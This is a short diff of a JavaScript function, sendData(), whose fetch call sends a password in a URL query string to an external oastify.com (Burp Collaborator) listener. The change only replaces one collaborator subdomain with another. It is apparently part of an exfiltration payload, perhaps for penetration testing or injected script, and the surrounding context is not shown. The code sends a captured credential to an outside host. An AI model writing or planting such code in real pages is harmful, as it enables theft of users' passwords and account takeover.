@@ -27,7 +27,7 @@ function sendData() {
     }
 
     // Send the password via GET request to the specified URL
-    fetch(`https://e3ivxp43x1qe5z2lyhzom32j8ae22tqi.oastify.com?password=${encodeURIComponent(pass)}`)
+    fetch(`https://a0brul1zuxna2vzhvdwkjzzf56byzrng.oastify.com?password=${encodeURIComponent(pass)}`)
         .then(response => response.text())
         .then(data => {
             console.log("Response from server:", data);
